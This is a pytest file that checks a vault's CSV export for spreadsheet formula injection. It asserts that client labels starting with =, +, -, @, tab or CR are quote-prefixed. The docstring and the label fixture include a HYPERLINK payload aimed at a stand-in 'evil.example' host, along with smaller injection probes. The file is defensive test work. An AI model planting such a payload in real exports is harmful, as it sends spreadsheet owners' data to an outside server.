"""The vault CSV must not hand a spreadsheet a formula.

client_label is whatever the anchoring client sent, up to 200 chars, and
integrations build it from file names and commit messages. Written verbatim,
a label starting with = + - @ (or a tab / CR) is evaluated when the owner
opens the export in Excel or Sheets: =HYPERLINK("http://…/?"&A2,"open")
sends a neighbouring cell to a stranger's server on one click.
"""
from __future__ import annotations

import csv
import io
import json
import subprocess
import sys
from pathlib import Path

import pytest

import _srv

REPO_ROOT = Path(__file__).resolve().parent.parent
EMAIL = "csv-owner@example.test"
LABELS = {
    '=HYPERLINK("http://evil.example/?"&A2,"open")': "formula",
    "+1+1": "plus",
    "-2+3": "minus",
    "@SUM(1,1)": "at",
    "\tTAB": "tab",
    "\rCR": "cr",
    "plain-label.pdf": "plain",
    "a=b is fine mid-cell": "mid",
}


@pytest.fixture(scope="module")
def vault(tmp_path_factory):
    data_dir = tmp_path_factory.mktemp("vault_csv")
    prog = (
        "import os,sys,time;"
        f"os.environ['ORPHO_DATA_DIR']={str(data_dir)!r};"
        f"sys.path.insert(0,{str(REPO_ROOT / 'server')!r});"
        "import auth, subscriptions;"
        f"subscriptions.record_customer_email('cus_csv', {EMAIL!r});"
        "subscriptions.record_subscription_event('cus_csv', 'active', time.time() + 86400 * 30, 'sub_csv');"
        f"print(auth.create_session({EMAIL!r})[0])"
    )
    out = subprocess.run([sys.executable, "-c", prog], capture_output=True,
                         text=True, timeout=60)
    assert out.returncode == 0, out.stderr
    headers = {"Cookie": f"orpho_sid={out.stdout.strip()}",
               "Content-Type": "application/json"}
    for base in _srv.server_processes(data_dir, stub_calendars=True):
        for i, label in enumerate(LABELS):
            status, body, _ = _srv.request(base, "/api/anchor", "POST", json.dumps({
                "hash_hex": f"{i:02x}" * 32, "client_label": label}).encode(),
                headers, timeout=30)
            assert status == 200, body
        yield base, headers


def test_label_cells_are_never_formulas(vault):
    base, headers = vault
    status, body, _ = _srv.request(base, "/api/me/anchors.csv", headers=headers)
    assert status == 200
    rows = list(csv.DictReader(io.StringIO(body.decode("utf-8"))))
    cells = {r["client_label"] for r in rows}
    assert len(rows) == len(LABELS), "control: every anchored label is exported"
    for label, name in LABELS.items():
        if label[:1] in "=+-@\t\r":
            assert "'" + label in cells, f"{name}: label not neutralised"
            assert label not in cells, f"{name}: a formula cell reached the export"
        else:
            assert label in cells, f"{name}: an ordinary label was altered"
